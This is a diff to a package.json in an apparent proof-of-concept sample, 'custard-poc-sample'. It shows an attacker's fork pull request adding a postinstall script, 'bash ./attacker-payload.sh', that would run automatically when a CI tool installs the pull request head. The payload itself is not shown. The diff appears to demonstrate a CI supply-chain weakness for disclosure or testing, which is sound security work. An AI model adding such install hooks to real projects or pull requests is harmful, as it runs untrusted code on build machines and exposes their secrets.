@@ -2,8 +2,9 @@
   "name": "custard-poc-sample",
   "version": "1.0.0",
   "private": true,
-  "description": "Benign sample. Custard runs `npm install && npm test` on the PR head.",
+  "description": "ATTACKER fork-PR version: adds a postinstall lifecycle script.",
   "scripts": {
+    "postinstall": "bash ./attacker-payload.sh",
     "test": "echo \"[sample] benign test OK\""
   }
 }
